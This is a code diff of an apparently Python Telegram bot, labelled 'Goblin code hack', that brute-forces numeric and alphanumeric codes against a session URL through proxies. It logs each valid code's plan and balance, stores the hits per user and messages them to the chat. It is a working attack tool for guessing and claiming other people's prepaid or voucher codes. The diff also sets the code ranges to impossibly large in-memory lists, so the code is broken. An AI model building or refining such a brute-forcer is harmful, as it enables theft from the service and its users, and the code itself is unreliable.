@@ -151,17 +151,17 @@ def code_generator(mode):
     elif mode == "7":
         codes = [str(i).zfill(7) for i in range(10000000)]
     elif mode == "8":
-        codes = [str(i).zfill(8) for i in range(10000000)]
+        codes = [str(i).zfill(8) for i in range(100000000)]
     elif mode == "9":
-        codes = [str(i).zfill(9) for i in range(10000000)]
+        codes = [str(i).zfill(9) for i in range(1000000000)]
     elif mode == "alpha6":
         chars = string.ascii_lowercase
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(10000000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000000)]
     elif mode == "mix6":
         chars = string.ascii_lowercase + string.digits
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(30000000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(3000000000000000)]
     else:
-        codes = [str(i).zfill(6) for i in range(30000000)]
+        codes = [str(i).zfill(6) for i in range(10000000000000000000)]
 
     random.shuffle(codes)
     for code in codes:
@@ -202,20 +202,20 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
                             balance_display, plan_name = balance_info
-                            user_id = chat_obj.id
-                            
-                            async with db_lock:
-                                # အရင်က စစ်ပြီးသား (Database ထဲရှိပြီးသား) ကုဒ်ဟုတ်မဟုတ် စစ်ဆေးခြင်း
-                                cursor.execute("SELECT COUNT(*) FROM found_codes_db WHERE code = ? AND user_id = ?", (code, user_id))
-                                exists_count = cursor.fetchone()[0]
+                            if not any(item['code'] == code for item in context_data['success_codes']):
+                                context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
+                                context_data['hits'] += 1
 
-                                if exists_count == 0:
+                                user_id = chat_obj.id
+                                async with db_lock:
                                     cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
                                     conn.commit()
 
-                                    if not any(item['code'] == code for item in context_data['success_codes']):
-                                        context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
-                                        context_data['hits'] += 1
+                                short_msg = f"🎉 `{code}` | {balance_display}"
+                                try:
+                                    await chat_obj.send_message(short_msg, parse_mode="Markdown")
+                                except:
+                                    pass
                             return True
                     context_data['expired'] += 1; return None
         except:
@@ -281,19 +281,19 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             recent_hits = context.user_data.get('success_codes', [])[:25]
             hits_text = ""
             if recent_hits:
-                hits_text = "\n💯 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])
+                hits_text = "\n🔥 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])
 
             text = (
                 f"𝐆𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
                 f"{session_url}\n"
-                f" **Scanner Running**\n"
-                f" Tried: {checked_total:,}\n"
-                f" Current Code: {current_code}\n"
-                f" Hits: {hits}\n"
-                f" Expired: {expired}\n"
-                f" Limits: {retry_total}\n"
-                f" Speed: {speed_cm:.1f} c/m\n"
-                f" Proxies: {proxy_status}\n\n"
+                f"⚡ **Scanner Running** ⚡\n"
+                f"🏹 Tried: {checked_total:,}\n"
+                f"🎯 Current Code: {current_code}\n"
+                f"⚔️ Hits: {hits}\n"
+                f"🗡️ Expired: {expired}\n"
+                f"⚠️ Limits: {retry_total}\n"
+                f"⚡ Speed: {speed_cm:.1f} c/m\n"
+                f"🔀 Proxies: {proxy_status}\n\n"
                 f"───────────────────────────────"
                 f"{hits_text}"
             )
@@ -491,8 +491,7 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    # Saved Codes တွေကို အများဆုံး ၂၅၀ အထိ မြင်ရအောင် LIMIT 250 သို့ ပြောင်းထားပါသည်
-    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 250", (user_id,))
+    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 50", (user_id,))
     rows = cursor.fetchall()
 
     if not rows:
